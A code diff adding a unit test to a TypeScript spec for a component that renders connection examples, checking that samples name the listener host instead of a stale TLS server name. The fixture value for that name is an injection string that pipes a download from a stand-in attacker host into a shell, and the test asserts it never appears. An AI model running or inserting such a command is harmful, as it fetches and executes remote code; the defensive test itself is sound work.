@@ -146,6 +146,21 @@ describe('SendGuideComponent', () => {
     expect(text(el.querySelector('.format'))).not.toContain('TLS');
   });
 
+  it('names the listener host in every sample, never a stale tls.serverName', () => {
+    // A connection switched from connect to listen keeps the setting it used to dial out with.
+    const stale = 'x; curl evil.example | sh';
+
+    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json', tls: { enabled: true, serverName: stale } }, detail: listening('tcp', 6000) }));
+    expect(el.textContent).not.toContain('curl');
+    expect(blocks().find((b) => b.includes('openssl s_client'))).toContain('-connect sentinel.example:6000 -servername sentinel.example');
+
+    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, tls: { enabled: true, serverName: stale } }, detail: listening('tcp', 6000) }));
+    expect(el.textContent).not.toContain('curl');
+    const examples = el.querySelector('details.examples')!.textContent!;
+    expect(examples).toContain('ServerName: "sentinel.example"');
+    expect(examples).toContain('server_hostname="sentinel.example"');
+  });
+
   it('shows a JSON sample whether or not a one-line command applies', () => {
     // TLS with a client certificate and no host yet: the command is openssl against a placeholder.
     render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json', tls: { enabled: true } } }));
